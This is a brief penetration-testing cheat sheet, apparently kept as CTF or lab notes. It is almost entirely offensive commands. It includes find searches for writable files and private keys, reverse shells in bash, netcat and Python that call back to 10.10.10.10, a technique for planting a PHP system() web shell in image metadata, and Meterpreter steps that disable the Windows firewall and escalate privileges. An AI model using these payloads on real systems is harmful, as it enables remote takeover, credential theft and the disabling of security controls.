## CHEATSHEET
### Linux

Find user owned files
~~~
find / -user $(whoami) 2>/dev/null | egrep -v '(/proc)'
~~~

Find writeable files
~~~
find / -writeable 2>/dev/null | egrep -v '(/proc|/run|/dev)'
~~~

Find readable files with following extensions
~~~
find / -readable 2>/dev/null | egrep '(\.key$|\.pub$|\.bak$|\.crt$|\.ca$|^id_rsa)'
~~~

Bash reverse shell
~~~
bash -i >& /dev/tcp/10.10.10.10/444 0>&1
~~~

Netcat reverse shell
~~~
nc -e /bin/bash 10.10.10.10 444
nc -e /bin.sh 10.10.10.10 444
~~~

Python reverse shell
~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
~~~

Upgrade shell with Python
~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
F+G+ENTER
~~~

Find files that aren't installed by the system
~~~
for i in $(ls $(pwd)/*); do dpkg --search $i 1>/dev/null; done
~~~

Inject PHP into image
~~~
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
~~~

**Windows**

Metasploit windows meterpreter session
~~~
execute -f cmd.exe -c -H
shell
netsh firewall show opmode
netsh advfirewall set allprofiles state off
getsystem
~~~
